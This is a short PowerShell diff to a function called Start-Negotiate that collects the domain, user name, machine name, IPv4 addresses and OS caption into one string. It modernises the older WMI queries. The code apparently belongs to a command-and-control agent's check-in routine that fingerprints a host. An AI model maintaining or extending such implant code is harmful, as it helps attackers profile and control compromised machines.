@@ -177,7 +177,7 @@ function Start-Negotiate {
     $i = $nonce + '|' + $s + '|' + [Environment]::UserDomainName + '|' + [Environment]::UserName + '|' + [Environment]::MachineName;
 
     try {
-        $p = (gwmi Win32_NetworkAdapterConfiguration | Where { $_.IPAddress } | Select -Expand IPAddress);
+        $p = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -notlike '127.*' } | Select-Object -ExpandProperty IPAddress);
     }
     catch {
         $p = "[FAILED]"
@@ -190,7 +190,7 @@ function Start-Negotiate {
     $i += "|$ip";
 
     try {
-        $i += '|' + (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+        $i += '|' + (Get-CimInstance -ClassName CIM_OperatingSystem).Caption;
     }
     catch {
         $i += '|' + '[FAILED]'
